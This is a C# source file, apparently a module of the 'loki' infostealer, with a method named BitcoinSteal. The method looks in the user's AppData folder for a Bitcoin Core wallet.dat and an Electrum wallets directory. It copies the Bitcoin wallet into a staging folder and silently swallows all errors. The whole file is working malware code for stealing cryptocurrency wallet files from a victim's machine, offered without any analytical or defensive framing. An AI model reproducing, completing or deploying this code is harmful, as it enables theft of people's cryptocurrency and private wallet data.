namespace loki.loki.Utilies.Wallets
{
    using System;
    using System.IO;

    internal class Wallets
    {
        public static void BitcoinSteal(string dir)
        {
            try
            {
                string text = Path.Combine(dir, "Wallets");
                if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Bitcoin", "wallet.dat")) || Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Electrum", "wallets")))
                {

                    Directory.CreateDirectory(text);
                    try
                    {
                        if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Bitcoin", "wallet.dat")))
                        {
                            Directory.CreateDirectory(Path.Combine(text, "Bitcoin"));
                            File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Bitcoin", "wallet.dat"), Path.Combine(text, "Bitcoin", "wallet.dat"));
                        }
                    }
                    catch { }
                    try
                    {
                        if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Electrum", "wallets")))
                        {
                            Directory.CreateDirectory(Path.Combine(text, "Electrum"));
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}